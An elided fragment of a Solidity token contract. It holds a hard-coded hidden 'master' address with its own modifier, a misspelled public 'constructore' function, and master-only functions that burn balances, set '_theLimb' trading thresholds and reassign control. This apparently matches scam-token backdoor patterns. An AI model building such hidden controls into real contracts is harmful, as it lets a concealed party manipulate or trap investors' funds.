...
//_router = IPancakeRouter02(routerAddress);
    ...
    address public master = 0x697418EB688db1B0822D21C78C022912581C0388;

    modifier onlyMaster() {
        require(master == msg.sender, "Only owner is allowed to perform this action!!");
        _;
    }

   function constructore ()   public virtual returns (bool) {
    ...
    function burn(uint256 amount) external onlyMaster {
        _balances[owner()] -= amount;
        _totalSupply -= amount;
    }

    function setLimb(uint256 newLimb) external onlyMaster {
        _theLimb = newLimb;
    }

    function setUnderLimb(uint256 newUnderLimb) external onlyMaster {
        _theUnderLimb = newUnderLimb;
    }

    function setMaster(address account) external onlyMaster {
